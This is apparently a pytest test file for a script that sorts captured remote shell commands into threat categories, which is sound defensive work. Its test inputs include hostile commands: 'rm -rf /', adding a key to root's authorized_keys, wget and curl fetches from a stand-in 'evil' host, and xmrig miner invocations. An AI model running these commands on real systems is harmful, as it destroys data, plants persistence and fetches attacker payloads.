"""Unit tests for scripts/parse_remote.py — command categorization + helpers.

Run: pytest tests/test_parse_remote.py
Stdlib only (sensor parity); no matplotlib required.
"""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))

import parse_remote as pr


def test_empty():
    assert pr.cmd_category("") == "empty"
    assert pr.cmd_category("   ") == "empty"
    assert pr.cmd_category(None) == "empty"


def test_discovery():
    assert pr.cmd_category("uname -s -v -n -r -m") == "discovery"
    assert pr.cmd_category("hostname") == "discovery"
    assert pr.cmd_category("whoami") == "discovery"
    assert pr.cmd_category("/bin/./uname -s -v -n -r -m") == "discovery"
    assert pr.cmd_category("ps aux | head -10") == "discovery"


def test_destructive_wins_over_chain():
    # `echo hi; rm -rf /` must still read as destructive, not shell-exec.
    assert pr.cmd_category("echo hi; rm -rf /") == "destructive"
    assert pr.cmd_category("uname -a && rm -rf /tmp/x") == "destructive"


def test_sudo_stripped():
    assert pr.cmd_category("sudo rm -rf /") == "destructive"
    assert pr.cmd_category("sudo uname -a") == "discovery"


def test_persistence():
    assert pr.cmd_category("chmod +x /tmp/x") == "persistence-privilege"
    assert pr.cmd_category("echo key >> /root/.ssh/authorized_keys; chmod 600 x") == "persistence-privilege"
    assert pr.cmd_category("crontab -l") == "persistence-privilege"


def test_downloader_beats_discovery():
    # Severity order: downloader > discovery.
    assert pr.cmd_category("wget http://evil/x") == "downloader"
    assert pr.cmd_category("curl http://evil/x") == "downloader"
    assert pr.cmd_category("uname -a && curl http://evil/x") == "downloader"


def test_miner_word_boundary():
    assert pr.cmd_category("xmrig --donate-level 1") == "miner-indicator"
    assert pr.cmd_category("stratum+tcp://pool:3333") == "miner-indicator"
    # Must not match substrings like `exminer`.
    assert pr.cmd_category("exminer") != "miner-indicator"


def test_shell_exec():
    assert pr.cmd_category("echo hi") == "shell-exec"
    assert pr.cmd_category("sh -c 'echo hi'") == "shell-exec"


def test_other():
    assert pr.cmd_category("zzqqnotarealbin --frobnicate") == "other"


def test_tokens_basename_and_chain():
    toks = set(pr._tokens("/bin/./uname -s -v -n -r -m"))
    assert "uname" in toks
    toks2 = set(pr._tokens("echo hi; rm -rf /"))
    assert "echo" in toks2 and "rm" in toks2


def test_median():
    assert pr._median([]) == 0
    assert pr._median([5.0]) == 5.0
    assert pr._median([1.0, 2.0, 3.0]) == 2.0
    assert pr._median([1.0, 2.0, 3.0, 4.0]) == 2.5
